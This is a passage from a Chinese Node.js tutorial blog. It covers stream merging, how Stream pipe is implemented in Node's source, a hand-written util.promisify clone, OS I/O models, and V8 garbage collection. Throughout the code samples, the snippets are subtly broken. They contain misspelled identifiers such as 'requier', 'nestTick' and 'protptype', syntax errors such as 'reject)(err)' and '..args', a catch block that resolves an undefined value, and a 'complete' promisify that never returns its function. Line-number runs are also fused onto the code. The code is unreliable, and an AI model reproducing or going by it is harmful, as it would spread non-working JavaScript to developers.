合并的递归调用 * @param &#123;Array&#125; scripts * @param &#123;Stream&#125; fileWriteStream*/function streamMergeRecursive(scripts = [], fileWriteStream) &#123; // 递归到尾 的情况判断 if (!scripts.length) &#123; return fileWriteStream.end("console.log('Stream 合并完成')") // 最后关闭可写流，防止内存泄露 &#125; const currentFile = path.resolve(__dirname, 'scripts/', scripts.shift()); const currentReadStream = fs.createReadStream(currentFile); // 获取当前的可读流 currentReadStream.pipe(fileWriteStream, &#123; end: false &#125;); currentReadStream.on('end', () =&gt; &#123; streamMergeRecursive(scripts, fileWriteStream) &#125;) currentReadStream.on('error', (error) =&gt; &#123; // 监听错误事件，关闭可读流，防止内存泄露 console.log(error); fileWriteStream.close() &#125;)&#125;streamMerge('./scripts', './script.js') Stream pipe的使用与实现原理通过流我们可以将一大块数据拆分称为一小部分一点一点的流动起来，不需要一次性全部读入，在Linux下可以通过|符号实现，类似的在Nodejs的Stream模块中同样也为我们提供了 pipe方法来实现 未使用Stream pipe的情况在Nodejs中I/O操作都是异步的，先用util模块的promiseify方法将fs.readFile的callback形式转换为Promise形式 ，它将数据一次性读入内存然后再进行返回，当数据文件很大的时候也是对内存的一种消耗，不推荐 123456789101112131415// koa 的例子const Koa = require('koa');const fs = require('fs');const app = new Koa();const &#123;promisify&#125; = require('util');const &#123;resolve&#125; = require('path');const readFile = promisify(fs.readFile);app.use(async ctx=&gt;&#123; try&#123; ctx.body = await readFile(resolve(__dirname,'test.json'))) &#125;catch(err)&#123; ctx.body = err &#125;&#125;).listen(3000) 使用Steam pipe12345678910111213app.use(async ctx=&gt;&#123; try&#123; const readable = fs.createReadStream(resolve(__dirname,'test.json')); ctx.body = readable; &#125;catch(err)&#123; ctx.body = err; &#125;&#125;)// 在Koa中直接创建一个可读流赋值给ctx.body，框架内封装好了pipe方法，下面为源码function respond(ctx)&#123; let body = ctx.body; if(body instanceof Stream) return body.pipe(res)&#125; 使用与不使用Stream使用了可读流，通过pipe接口监听data与end事件，把data的可读流拆分称为一小块一小块的数据（chunks），像流水一样源源不断吐给客户端，而不再需要等待整个文件都加载到内存后才发送数据。pipe可以视为流的管道/通道方法，任何类型的流都会有这个方法来处理流的输入与输出。 总体来说，使用流可以大大提升响应时间，又能有效减轻服务器内存的压力 源码分析在应用层调用 fs.createReadStream 方法，找到这个方法创建的可读流对象pipe的方法实现 /lib/fs.js123456789101112131415161718// 导出一个createReadStream方法，在这个方法里面创建一个ReadSream可读流对象，且ReadStream来自internal/fs/streams// 懒加载，主要在用到的时候用来实例化 ReadStream/WriteStream等对象function lazyLoadStreams()&#123; if(!ReadStream)&#123; (&#123;ReadStream,WriteStream&#125;) = require('internal/fs/streams'); [FileReadStream,FileWriteStream] = [ReadStream,WriteStream]; &#125;&#125;function createReadStream(path,options)&#123; lazyLoadStreams(); return new ReadStream(path,options); // 创建一个可读流&#125;module.exports = fs = &#123; createReadStream, // 导出 createReadStream 方法&#125; /lib/internal/fs/streams.js12345678910111213141516171819202122// 这个方法定义了构造函数 ReadStream，且在原型上定义了 open、_read、_destroy等方法，没有pipe方法，通过ObjectSetPrototypeOf方法实现了继承，ReadStream继承了Readable在原型中定义的函数，继续查找Readable的实现const &#123;Readable,Writeable&#125; = require('stream');function ReadStream(path,options)&#123; if(!(this instanceof ReadStream)) return new ReadStream(path,options) Readable.call(this,options)&#125;ObjectSetPrototypeOf(ReadStream.prototype,Readable.prototype);ObjectStreamProtptypeOf(ReadStream,Readable);ReadStream.prototype.open = function()&#123;&#125;ReadStream.prototype._read = function(n)&#123;&#125;ReadStream.prototype._destroy = function(err,cb)module.exports = &#123; ReadStream, WriteStream&#125; /lib/stream.js123456789// to avoid cross-reference(require) issueconst Stream = module.exports = require('internal/streams/legacy');Stream.Readable = require('_stream_readable');Stream.Writable = require('_stream_writable')Stream.Duplex = require('_stream_duplex');Stream.Transform = requier('_stream_transform');Stream.PassThrough = require('_stream_passthrough'); /lib/internal/streams/legacy.js123456789101112131415// 继承了Events 模块，然后在原型上定义了pipe方法，而_stream_readable继承了Stream之后又自己实现了pipe方法const &#123;ObjectSetPrototypeOf&#125; = primordials;const EE = require('events');function Stream(opts)&#123; EE.call(this,opts)&#125;ObjectSetPrototypeOf(Stream.prototype,EE.prototype);ObjectSetPrototypeOf(Stream,EE);Stream.prototype.pipe = function(dest,options)&#123; // ...&#125;module.exports = Stream; /lib/_stream_readable.js123456789101112131415// 定义了Readable构造函数，且继承于lib/stream.js的Stream，然后重写pipe方法module.exports = Readable;Readable.ReadableState = ReadableState;const EE = require('events');const Stream = require('stream');ObjectSetPrototypeOf(Readable.prototype,Stream.prototype)ObjectSetPrototypeOf(Readable,Stream);function Readable(options)&#123; if(!(this instanceof Readable)) return new Readable(options) Stream.call(this,options); // 继承自 Stream构造函数的定义&#125; _stream_readable.js实现分析1.声明构造函数Readable，继承Stream的构造函数和原型。 文件继承了events事件，拥有了events在原型中定义的属性，例如on、emit 2.声明pipe方法，订阅data事件 在Stream原型上声明pipe方法，订阅data事件，src为可读对象，dest为可写流对象。在使用pipe方法的时候也是监听的data事件，一边读取一边写入数据。 ondata方法的几个核心的实现： dest.write(chunk):接受chunk写入数据，如果内部的缓冲小于创建流时配置的highWaterMark，则返回true（缓存未满）,否则返回false时应该停止向流写入数据，直到‘drain’（清空缓存）事件被触发 src.pause()：可读流会停止data事件，意味着此时暂停数据写入了 调用src.pause是为了防止读入数据过快来不及写入，如果缓存未满即dest.write(chunk)，这个缓存是根据创建流时创建的highWaterMark属性，默认为16384（16k），对象模式的流默认为16 1234567891011Readable.prototype.pipe = function(dest,options)&#123; const src = this; src.on('data',ondata); function ondata()&#123; const ret = dest.write(chunk); if(ret === false)&#123; ... src.pause(); &#125; &#125;&#125; 3.订阅drain事件，继续流动数据。继续写入事件到流时会触发drain事件，也就是dest.write(chunk)等于false(缓存满了)时，如果ondrain不存在则注册drain事件 12345678910111213141516171819202122232425262728293031323334353637383940Readable.prototype.pipe = function(dest,options)&#123; const src = this; src.on('data',ondata); function ondata()&#123; const ret = dest.write(chunk); if(ret === false)&#123; ... if(!ondrain)&#123; // When the dest drains, it reduces the awaitDrain counter // on the source. This would be more elegant with a .once() // handler in flow(), but adding and removing repeatedly is // too slow. ondrain = pipeOnDrain(src); dest.on('drain',ondrain); &#125; src.pause(); &#125; &#125; // 当写入流dest耗尽时，它将会在可读流对象 source上减少 awaitDrain计数器，为了确保所有需要缓存的写入都完成，即state.awaitDrain === 0和src可读流上的data事件存在，切换流到流动模式 function pipeOnDrain(src)&#123; return function pipeDrainFunctionResult()&#123; const state = src._readableState; debug('pipeOnDrain',state.awaitDrain); if(state.awaitDrain)&#123; state.awaitDrain--; &#125; if(state.awaitDrain ===0 &amp;&amp; EE.listenerCount(src,'data'))&#123; state.flowing = true; flow(src) &#125; &#125; &#125; // Stream.read() 从内部缓存拉取并返回数据，如果没有可读的数据，则返回null，在可读流上src还有一个readable属性，如果可以安全地调用readable,read(),则为true function slow(stream)&#123; const state = stream._readableState; debug('flow',state.flowing); while(state.flowing &amp;&amp; stream.read() !== null) &#125;&#125; 4.触发data事件。调用readable的resume方法，触发可读流的data事件，进入流动模式 12345678Readable.prototype.pipe = function(dest,options)&#123; const src = this; // start the flow if it hasnot been started already. if(!state.flowing)&#123; debug('pipe resume') src.resume(); &#125;&#125; resume方法内部又调用resume_()，最终执行了stream.read(0)读取了一次空数据（size设置为0），将会触发实例上的_read()方法，再触发data事件。 12345678910function resume(stream,state)&#123; process.nextTick(resume_,stream,state)&#125;function resume_(stream,state)&#123; debug('resume',state.reading); if(!state.reading)&#123; stream.read(0); &#125;&#125; 5.订阅end事件 end事件：当可读流中没有数据可供消费时触发，调用onend函数，执行dest.end()方法，表明已没有数据要被写入可写流，进行关闭（关闭可写流的id）,之后再调用stream.write会导致错误。 12345678910111213141516Readable.prototype.pipe = function(dest,options)&#123; const doEnd = (!pipeOpts || pipeOpts.end !== false) &amp;&amp; dest !== process.stdout &amp;&amp; dest !== process.stderr; const endFn = doEnd?onend:unpipe; if(state.endEmitted)&#123; process.nestTick(endFn) &#125;else&#123; src.once('end',endFn) &#125; dest.on('unpipe',onunpipe) function onend()&#123; debug('onend'); dest.end(); &#125;&#125; 6.触发pipe事件，传入可读流对象 1234Readable.prototype.pipe = function(dest,options)&#123; const source = this; dest.emit('pipe',src);&#125; 在应用层使用但的时候可以在可写流上订阅pipe事件，做一些判断。 7.支持链式调用，最后返回dest 123Stream.protptype.pipe = function(dest,options)&#123; return dest;&#125; /lib/internal/streams/legacy.js模块实现分析声明构造函数Stream声明构造函数Stream继承于事件events,此时就拥有了events在原型定义的属性，例如on/emit等方法 123456789const &#123;ObjectSetPrototypeOf&#125; = primordials;const EE = require('events');function Stream(opts)&#123; EE.call(this,opts)&#125;ObjectSetPrototypeOf(Stream.prototype,EE.prototype);ObjectSetPrototypeOf(Stream,EE) 声明pipe方法，订阅data事件在Stream原型上声明pipe方法，订阅data事件，source为可读流对象，dest为可写流对象 在使用pipe方法的时候也是监听的data事件，一边读取数据一边写入数据 ondata方法的几个API： dest.writable：如果调用writable.write()是安全的，则为true dest.write(chunk)：接收chunk写入数据，如果内部的缓冲小于内部创建流时配置的highWaterMark，则返回true,否则返回false时应该停止向流写入数据，知道drain事件被触发。 source.pause()：可读流会停止data事件，意味着此时暂停数据写入了 123456789Stream.prototype.pipe = function(dest,options)&#123; const source = this; function ondata(chunk)&#123; if(dest.writable &amp;&amp; dest.write(chunk) === false &amp;&amp; source.pause)&#123; source.pause(); &#125; &#125; source.on('data',ondata)&#125; 订阅drain事件如果调用dest.write(chunk)返回false,就会调用source.pause()停止数据流动，继续写入事件到流时会触发drain事件，ondrain方法的几个API： source.readable：如果可以安全地调用readable.read()，则为true,例如数据未读到末尾，则会返回true，表示可读的。 source.resume()：将被暂停的可读流恢复触发data事件，并将流切换流动模式 12345678Stream.prototype.pipe = function(dest,options)&#123; function ondrain()&#123; if(source.readable &amp;&amp; source.resume)&#123; source.resume(); &#125; &#125; dest.on('drain',ondrain)&#125; 选项指定end属性，订阅end,close事件1234567891011121314151617181920212223242526// 如果end选项没有被提供，可读流订阅end或者close事件，后续将会触发该事件，指定dest.end方法，仅被调用一次，didOnEnd变量做了控制，主要是为了关闭可写流的id// close:当流或者底层资源（比如文件描述符）被关闭时触发close事件// end: 当可读流中没有数据可供消费的时候触发// 可读流的end,destroy方法// dest.end() 表明已经没有数据要被写入可写流，进行关闭，之后再调用stream.write会导致错误// dest.destory() 销毁流Stream.prototype.pipe = function(dest,options)&#123; if(!dest._isStdio &amp;&amp; (!options || options.end !== false))&#123; source.on('end',onend); source.on('close',onclose); &#125; let didOnEnd = false; function onend()&#123; if(didOnEnd) return; didOnEnd = true; dest.end(); &#125; function onclose()&#123; if(didOnEnd) return; didOnEnd = true; if(typeof dest.destory === 'function')&#123; dest.destroy(); &#125; &#125;&#125; 订阅可读流与可写流的error事件可读流、可写流发生错误时触发error事件，调用onerror方法，首先移除可读流，可写流订阅的所有事件 123456789101112131415161718192021222324252627Stream.prototype.pipe = function()&#123; function onerror(er)&#123; cleanup(); if(EE.listenerCount(this,'error') == 0)&#123; throw er; &#125; &#125; source.on('error',onerror); dest.on('error',onerror); function cleanup()&#123; source.removeListener('data',ondata); dest.removeListener('drain',ondrain); source.removeListener('end',onend); source.removelistener('close',onclose); source.removeListener('error',onerror); dest.removelistener('error',onerror); source.removeListener('end',cleanup); source.removelistener('close',cleanup); dest.removelistener('close',cleanup); &#125;&#125; 触发pipe事件在pipe方法里面最后还会触发一个pipe事件，传入可读流对象 1234Stream.prototype.pipe = function(dest,options)&#123; const source = this; dest.emit('pipe',source);&#125; 支持链式调用最后返回dest,支持A.pipe(B).pipe(c)的写法： 123Stream.prototype.pipe = function(dest,options)&#123; return dest;&#125; util.promisify如何将Callback转换为Promiseutil模块提供了很多工具函数，其中promisify方法可以将callback转换为Promise对象，解决回调地狱的问题。 简单实现版本util promisify基本使用将callback转为promise对象，首先确保这个callback为一个错误优先的回调函数，即(err,value)=&gt;err指定一个错误参数，value为返回值 123456789101112131415// 创建一个text.txt文件，写入一些自定义内容，使用fs.readFile来读取这个文件进行测试// 传统的Callback写法const util = require('util');fs.readFile('text.txt','utf8',(err,result)=&gt;&#123; console.log('Error',err); console.log('Result: ',result)&#125;)// Promise写法const &#123;promisify&#125; = require('util');const readFilePromisify = util.promisify(fs.readFile); // 转换为PromisereadFilePromisify('text.txt','utf8') .then(result=&gt;console.log(result)) .catch(err=&gt;console.log(err)) 自定义mayJunPromisify函数实现 自定义mayJunPromisify函数实现callback转换为promise，核心实现如下： 校验传入的参数original是否为Function,不是则抛错 promisify(fs.readFile)执行之后会返回一个函数fn,定义待返回的函数后返回 fn返回的是一个Promise对象，在返回的Promise对象中执行callback函数 12345678910111213141516171819202122function mayJunPromisify(original)&#123; if(typeof original !== 'function')&#123; throw new Error('The "original" argument must be of type Function,Received type undefined') &#125; function fn(...args)&#123; return new Promise((resolve,reject)=&gt;&#123; try&#123; original.call(this,...args,(err,result)=&gt;&#123; if(err)&#123; reject(err) &#125;else&#123; resolve(result) &#125; &#125;) &#125;catch(err)&#123; resolve(result) &#125; &#125;) &#125; return fn;&#125; util.promisify.custom基本使用另一个功能是可以使用util.promise.custom符号重写util.promisify返回值。 在fs.readFile上定义util.promisify.custom符号，其功能为禁止读取文件 123456789// 注意顺序要在 util.promisify之前fs.readFile[util.promisify.custom] = ()=&gt;&#123; return Promise.reject('该文件暂时禁止读取')&#125;const readFilePromisify = util.promisify(fs.readFile);readFilePromisify('text.txt','utf8') .then(result=&gt;console.log(result)) .catch(err=&gt;console.log(err)) // 该文件暂时禁止读取 自定义mayJunPromisify.custom实现 定义一个Symbol变量kCustomPromisifiedSymbol赋予mayJunPromisify.custom 校验是否有自定义的promise函数 自定义的mayJunPromisified.custom也要保证是一个函数，否则抛错 直接返回自定义的mayJunPromisify.custom函数，后续的fn函数就不会执行了，所以在这里重写util.promisify返回值 12345678910111213141516171819202122232425// 所以说util.promisify.custom是一个符号const kCustomPromisifiedSymbol = Symbol('util,promisify.custom');mayJunPromisify.custom = kCustomPromisifiedSymbol;function mayJunPromisify(original)&#123; if(typeof original !== 'function')&#123; throw new Error('The "original" argument must be of type Function,Received type undefined') &#125; if(original[kCustomPromisifiedSymbol])&#123; const fn = original[kCustomPromisifiedSymbol]; if(typeof fn !== 'function')&#123; throw new Error('The "mayJunPromise.custom" property must be of the type Function,Received type number') &#125; return Object.defineProperty(fn,kCustomPromisifiedSymbol,&#123; value:fn, enumerable:false, writable:false, configurable:true &#125;) &#125; function fn(...args)&#123;&#125; return fn;&#125; util.promisify回调函数多参转换有些函数的回调形式是多个参数的，例如dns.lookup，它的回调形式是(err,address,family)=&gt;...拥有 三个参数，对这种情况也做兼容 基本使用： 1234567const dns = require('dns');const lookupPromisify = util.promisify(dns.lookup);lookupPromisify('laibh.top') .then((&#123;address,family&#125;)=&gt;&#123; console.log('地址：',address,'地址族：',family)&#125;).catch(err=&gt;console.log(err)) 实现解析： 为了支持util.promisify也都会在函数上定义一个customPromisifyArgs参数，value为回调的多个参数的名称，类型为数组，例如dns.lookup绑定的customPromisifyArgs的value为[&#39;address&#39;,&#39;family&#39;]，其主要目的也是为了适配util.promisify dns.lookup支持util.promisify核心实现 123456const &#123;customPromisifyArgs&#125; = require('internal/util');ObjectDefineProperty(lookup,customPromisifyArgs,&#123; value:['address','family'], enumerable:false&#125;) customPromisifyArgs这个参数是从internal/util模块导出的，仅内部调用，在外部util.promisify是没有这个参数的。也就意味着只有Node模块中例如dns.lookup、fs.read等方法在多参数的时候可以使用util.promisify转换为Promise，如果自定义的callback存在多参数的情况，使用util.promisify则不行，不过可以基于util.promisify自己封装一个： 1234module.exports = &#123; // Symbol used to customize promisify conversion customPromisifyArgs:kCustomPromisifyArgsSymbol&#125; 定义Symbol变量kCustomPromisifyArgsSymbol 获取参数名称列表 (err,result)改为(err,...values),原先的result仅接受一个参数，改为...values接收多个参数 argumentNames存在且value&gt;1,则回调会存在多个参数名称，经常遍历，返回一个obj 否则values最多仅有一个参数名称，即数组values有且仅有一个元素 123456789101112131415161718192021222324252627282930const kCustomPromisifyArgsSymbol = Symbol('customPromisifyArgs');function promisify(original)&#123; // 获取多个回调函数的函数参数列表 const argumentName = original[kCustomPromisifyArgsSymbol]; function fn(..args)&#123; return new Promise((resolve,reject)=&gt;&#123; try&#123; original.call(this,...args,(err,...values)=&gt;&#123; if(err)&#123; reject(err) &#125;else&#123; // argumentNames存在且values&gt;1,则回调会存在多个参数名称，进行遍历，返回一个obj if(argumentNames !== undefined &amp;&amp; values.length &gt; 1)&#123; const obj = &#123;&#125;; for(let i=0;i&lt;argumentNames.length;i+=1)&#123; obj[argumentNames[i]] = values[i]; resolve(obj) &#125; &#125;else&#123; // 否则values最多只有一个参数名称，即数组values有且只有一个元素 resolve(values[0]) &#125; &#125; &#125;) &#125; &#125;) &#125; return fn;&#125; 完整代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// 由于kCustomPromiseArgsSymbol使用Symbol声明（每次重新定义都会不一样），且没有对外提供。要实现这个功能，需要每次在cb重新定义kCustomPromisifyArgsSymbol属性const kCustomPromisifiedSymbol = Symbol('util.promisify.custom');const kCustomPromisifyArgsSymbol = Symbol('customPromisifyArgs');mayJunPromisify.custom = kCustomPromisifiedSymbol;function mayJunPromisify(original)&#123; if(typeof original !== 'function')&#123; throw new Error('The "original" argument must be of type Function,Received type undefined') &#125; if(original[kCustomPromisifiesSymbol])&#123; const fn = original[kCustomPromisifiesSymbol]; if(typeof fn !== 'function')&#123; throw new Error('The "util.promisify.custom" property must be of type Function.Received type number') &#125; return Object.defineProperty(fn,kCustomPromisifiedSymbol,&#123; value:fn, enumerable:false, writable:false, configurable:true &#125;) // 获取多个回调函数的参数列表 const argumentNames = original[kCustomPromisifyArgsSymbol]; function fn(...args)&#123; return new Promise((resolve,reject)=&gt;&#123; try&#123; original.call(this,...args,(err,...values)=&gt;&#123; if(err)&#123; reject)(err); &#125;else&#123; // argumentName 存在且 values&gt;1,则回调会存在多个参数名称，进行遍历，返回一个obj if(argumentNames !== undefined &amp;&amp; values.length &gt; 1)&#123; const obj = &#123;&#125;; for(let i=0;i&lt;argumentNames.length;i+=1)&#123; obj[argumentNames[i]] = values[i] resolve(obj) &#125; &#125;else&#123; // 否则values最多仅有一个参数名称，即数组values有且仅有一个元素 resolve(values[0]) &#125; &#125; &#125;) &#125;catch(err)&#123; reject(err) &#125; &#125;) &#125; &#125;&#125;module.exports = &#123; mayJunPromisify, kCustomPromisifyArgsSymbol&#125; 使用： 12345678910111213141516171819202122232425262728293031323334353637const &#123;kCustomPromisifyArgsSymbol,mayJunPromisify&#125; = require('./may-jun-promisify');const fs = require('fs');// mayJunPromisify.custom自定义Promise函数测试function promisifyCustomTest()&#123; fs.readFile[mayJunPromisify.custom]=()=&gt;&#123; return Promise.reject('该文件暂时禁止读取') &#125; const readFilePromisify = mayJunPromisify(fs.readFile); readFilePromisify('text.txt','utf8') .then(result=&gt;console.log(result)) .catch(err=&gt;console.log(err)))&#125;// 自定义cb多参数转换promisefunction cbConverPromiseTest()&#123; function getUserById(id,cb)&#123; const name = 'laibh', age = 25; cb(null,name,age); &#125; Object.defineProperty(getUserById,kCustomPromisifyArgsSymbol,&#123; value:['name','age'], enumerable:false &#125;) const getUserByIdPromisify = mayJunPromisify(getUserById); getUserByIdPromisify(1) .then(&#123;name,age&#125;=&gt;&#123; console.log(name,age); &#125;) .catch(err=&gt;console.log(err)) &#125;promisifyCustomTest();cbConverPromiseTest(); I/OI/O即Input/Output，输入输出端口，是信息处理系统与外部世界之间的通信，输入手是系统接收的信号或数据，输出的则是从其发送的信号或数据 一次I/O操作分为等待资源，使用资源两个阶段，常见的词网络I/O,磁盘I/O 阻塞与非阻塞I/O是对于操作系统内核而言的，发生在等待资源阶段，根据发起的I/O请求是否阻塞来判断 阻塞I/O：这种模式下一个用户进程在发起一个I/O操作之后，只有接收到响应或者超时时才可进行处理其他事情，否则I/O将会一直阻塞。以读取磁盘上的一段文件为例子，系统内核在完成磁盘寻道、读取数据、复制数据到内存之中之后，这个调用才算完成。阻塞的这段时间对CPU资源是浪费的。 非阻塞I/O：这种模式下一个用户进程发起一个I/O操作之后，如果数据没有就绪，会立刻返回（标志数据资源不可用），此时CPU时间片可以用来做一些其他事情。 同步与异步I/O同步与异步I/O发生在使用资源阶段。 同步I/O：应用发送或接受数据后，如果不返回，继续等待（此处发生阻塞），直到数据成功或失败返回。 异步I/O：应用发送或接受数据后立刻返回，数据写入OS缓存，由OS完成数据发送或接收，并返回成功或者失败的信息给应用，NodeJs就是典型异步编程的例子。 用户空间与内核空间操作系统为了多个应用同时运行，需要保证不同进程相对独立、内核的安全。所以操作系统把内存空间划分为用户空、内核空间两部分。用户空间存放用户程序代码和数据，而内核空间则存放内核代码和数据。 OSI七层模型与网际网协议族图：传输层之上（会话层、表示层、应用层）为用户空间（Web客户端、浏览器、FTP），下四层（传输层，网络层，数据链路层，物理层）为内核空间，例如传输层的TCP/UDP就对应内核空间。 操作系统I/O模型同步阻塞IO当进程调用 recvfrom() 函数的时候阻塞，应用程序开始系统调用，在系统内核数据就绪，将数据从内核中拷贝出来后结束。这个过程应用程序都处于等待状态，不能做其他事情，直到将数据拷贝到用户空间或出错才返回，我们称之为阻塞I/O模式。 同步非阻塞I/O想对于同步非阻塞I/O模式，同步非阻塞I/O在 每次调用之后，如果数据没有就绪就会立即返回，之后重复调用检查I/O操作是否就绪，这对CPU资源非常浪费，直到数据就绪将数据从内核拷贝到用户空间，返回成功指示到应用程序。 I/O多路复用链接（Socket）并发大的时候，上面的两种就不适合了，前面一个处理不完，后面的就只能干等。多路复用技术先进行select数据就绪后，调用recvfrom进行真正的I/O读写操作。高级之处在于能够一个线程同时处理多个Socket 多路复用中的I/O通常指的是网络I/O,多路指的是多个Socker链接，复用指操作系统进行运算调度最小单位线程，整体的意思就是多个网络I/O复用一个或少量线程来处理Socket I/O多路复用的四种实现：select/poll/epoll/kqueue select，通过轮询检查在文件描述符上设置的标志位来进行判断，select的轮询相当于在数据库中查找一条记录没有建立索引，对所有的socket进行全部遍历，这对CPU是浪费的。另外select还有一个限制，对于单个线程所能打开的文件描述符最大只有1024，那么基于select的轮询技术最多也只能很好的处理1000并发的吞吐量 poll,poll和select在实现上没有什么本质上的区别，poll基于链表来实现，没有了最大链接1024的限制。当文件描述符多了之后，每次调用都会对链接进行线性遍历，性能也是十分低下的。 epoll。是linux下效率最高的I/O事件通知机制，没有最大链接限制，通过callback回调通知机制，不再是每次调用对链接进行线性遍历，这样就不会随着文件描述符的增加导致效率下降。1GB内存的机器上大概能监听10w个端口，远超过select1024的限制 kqueue，与epoll类似，仅存于FreeBSD(一种类UNIX操作系统) 信号驱动IO仅在Unix上支持，与I/O多路复用相比避免了select的阻塞轮询，应用程序进行系统调用后立即返回，处理其他事情，在数据就绪之后系统会发送一个SIGIO信号到应用程序，应用程序开始读取数据 异步IO模型目前最理想形式的一种，应用程序发起系统调用后无需等待直接返回当前调用状态，进行后续的其他任务，结果由内核完成I/O操作之后通过回调通知到应用程序，中间没有阻塞过程。Linux2.6增加了AIO，但是很少系统能够实现 轮询技术Select 与 Epoll的区别操作方式上 select采用了线性遍历来查找，链接多了之后在一个庞大的数组中每次遍历来锁定一个链接，非常消耗性能 epoll则不需要遍历，采用的是回调机制，可以看作是一个HashTable，来锁定一个对象非常快。 文件描述符限制 对于文件描述符最大链接数select限制为1024 epoll则没有这个限制，通常在1GB内存的机器上所能支持的连接数为10W左右。 操作系统的支持 目前高性能的Web服务器Nginx是基于epoll来实现高并发的 Nodejs中的内存管理和V8垃圾回收机制在Nodejs中，关于垃圾回收、内存释放不需要像C语言创建一个对象之后需手动创建一个delete/free的一个操作之后进行GC,Nodejs与java一样，由虚拟机进行内存自动管理。 NodeJs中的GCnode.js是基于Chrome v8引擎的javascript运行环境，V8就是虚拟机。 垃圾回收内存管理实践内存泄露node提供process.memoryUsage方法来查看当前进程内存使用情况，单位为节 ress(resident set size)：RAM中保存的进程占用的内存部分，包括代码本身、栈、堆 heapTotal：堆中总共申请到的内存量 heapUsed：堆中目前用到的内存量，判断内存泄露主要以这个字节为准 external：V8引擎内存C++对象占用的内存 1234567891011121314151617181920212223/***单位字节格式为MB输出*/const format = function(bytes) return (bytes/1024/1024).toFixed(2)+' MB'&#125;/**封装print方法输出内存占用信息*/const print = function()&#123; const memoryUsage = process.memoryUsage(); console.log( JSON.stringify(&#123; res:format(memoryUsage.rss), heapTotal:format(memoryUsage.heapTotal), heapUsed:format(memoryUsage.heapUsed), external:format(memoryUsage.external), &#125;) )&#125; 内存泄露的例子堆用来存放对象引用类型，例如字符串、对象、在代码中创建一个Fruit存放在堆中 12345678910111213141516171819// example.jsfunction Quantity(num)&#123; if(num)&#123; return new Array(num * 1024 * 1024) &#125; return num;&#125;function Fruit(name,quantity)&#123; this.name = name; this.quantity = new Quantity(quantity);&#125;let apple = new Fruit('apple');print();let banane = new Fruit('banane',20);print();// 执行代码，aplle对象heapUsed使用仅有4.21M，而banana由于quantity属性创建了一个很大数组空间导致heapUsed飙升到164.21M。// &#123;"rss":"19.94 MB","heapTotal":"6.83 MB","heapUsed":"4.21 MB","external":"0.01 MB"&#125;// &#123;"rss":"180.04 MB","heapTotal":"166.84 MB","heapUsed":"164.24 MB","external":"0.01 MB"&#125; 手动执行垃圾回收内存释放123456banana = null;global.gc();print(); // 执行 node --expose-gc xxx.js --expose-gc参数表示运行手动执行垃圾回收机制，将banana对象赋值null进行GC// &#123;"rss":"52.48 MB","heapTotal":"9.33 MB","heapUsed":"3.97 MB","external":"0.01 MB"&#125;// heapUsed的使用已经降了下来 V8垃圾回收机制垃圾回收指的是回收那些在应用程序中不再引用的对象，当一个对象无法从根节点访问这个对象就会作为垃圾回收的候选对象。这里的根对象可以为全局对象、局部变量，无法从根节点访问指的也就是不会再被其他活动对象所引用。 V8堆内存限制在V8中限制64位机制大约为1.4G，32位的大概是0.7G，对于一些大内存的操作需要谨慎否则超出V8内存限制会造成进程退出 内存溢出边界的例子： 123456789101112131415161718// overflow.jsconst format = function(bytes)&#123; return (bytes / 1024 / 1024).toFixed(2)+' MB';&#125;const print = function()&#123; const memoryUsage = process.memoryUsage(); console.log( `heapTotal:$&#123;format(memoryUsage.heapTotal)&#125;, heapUsed: $&#123;format(memoryUsage.heapUsed)&#125;` )&#125;const total = [];setInterval(()=&gt;&#123; total.push(new Array(20*1024*1024)) // 大内存占用 print();&#125;,1000) total为全局变量每次增长大概在160M左右且不会被回收，在接近V8边界时无法分配内存导致进程内存溢出 123456789101112131415161718$ node overflow.jsheapTotal: 166.84 MB, heapUsed: 164.23 MBheapTotal: 326.85 MB, heapUsed: 324.26 MBheapTotal: 487.36 MB, heapUsed: 484.27 MBheapTotal: 649.38 MB, heapUsed: 643.98 MBheapTotal: 809.39 MB, heapUsed: 803.98 MBheapTotal: 969.40 MB, heapUsed: 963.98 MBheapTotal: 1129.41 MB, heapUsed: 1123.96 MBheapTotal: 1289.42 MB, heapUsed: 1283.96 MB&lt;--- Last few GCs ---&gt;[87581:0x103800000] 11257 ms: Mark-sweep 1283.9 (1290.9) -&gt; 1283.9 (1290.9) MB, 512.1 / 0.0 ms allocation failure GC in old space requested[87581:0x103800000] 11768 ms: Mark-sweep 1283.9 (1290.9) -&gt; 1283.9 (1287.9) MB, 510.7 / 0.0 ms last resort GC in old space requested[87581:0x103800000] 12263 ms: Mark-sweep 1283.9 (1287.9) -&gt; 1283.9 (1287.9) MB, 495.3 / 0.0 ms last resort GC in old space requested&lt;--- JS stacktrace ---&gt; v8提供了两个参数仅在启用阶段调整内存限制大小，分别为调整老生代、新生代： –max-old-space-size=2048 –max-new-space-size=2048 内存不是越大越好，一方面是服务器资源昂贵，另外是V8以1.5G的堆内存进行一次小的垃圾回收大约需要50毫秒以上时间，会导致JavaScript进程暂停，这也是最主要的一方面。 新生代与老生代新生代空间 由于新空间的垃圾回收机制很频繁，所以处理方式必须非常快，采用Scavenge算法，这是一种复制算法，新生代空间会被一分为二划分为两个相等大小的from-space和to-space工作方式是将from space中存活的对象复制出来，然后移动它们到to space 中或者被提升到老生代空间中，对于from space中没有存活的对象将会被释放，完成这些复制后再将from space和to space进行互换。 Scavenge算法适用少量内存的垃圾回收，但是有很大的空间开销，对于新生代少量内存是可以接受的 老生代空间 新生代空间在垃圾回收满足于一定的条件（是否经过Scavenge空间、to space内存占比）会被晋升到老生代空间中，在老生代空间中的对象都已经至少经历了一次或者多次的回收所以它们的存活概率会更大。在使用Scavenge算法会有两个缺点，一是将会重复的复制存活对象使得效率低下，二是对空间资源的浪费，所以在老生代空间中采用了 Mark-Sweep（标记清除）和Mark-Compact（标记整理）算法 Mark-Sweep处理时分为标记、清除两个步骤，与Scavenge算法只复制活对象相反的是在老生代空间中由于活对象占多数Mark-Sweep在标记阶段遍历堆中的所有对象仅标记活对象把未标记的死对象清除，这时一次标记清除就已经完成了。有一个问题是被清除的对象遍布于各内存地址，产生很多内存碎片 Mark-Compact(标记整理算法)为了解决内存碎片问题，在其工作过程中将活着的对象往一端移动，这时内存空间是紧凑的，移动完成之后，直接整理边界之外的内存。 小结V8使用了不同的垃圾回收算法Scavenge/Mark-Sweep/Mark-Compact.这三种垃圾回收算法都避免不了在进行垃圾回收时需要将应用程序暂停，待垃圾回收完成之后在恢复应用逻辑，对于新生代空间来说由于很快所以影响不大，但是对于老生代空间由于存活对象较多，停顿还是会造成影响的，因此V8又新增了增量标记的方式减少停顿时间。 内存泄露内存泄露（Memory 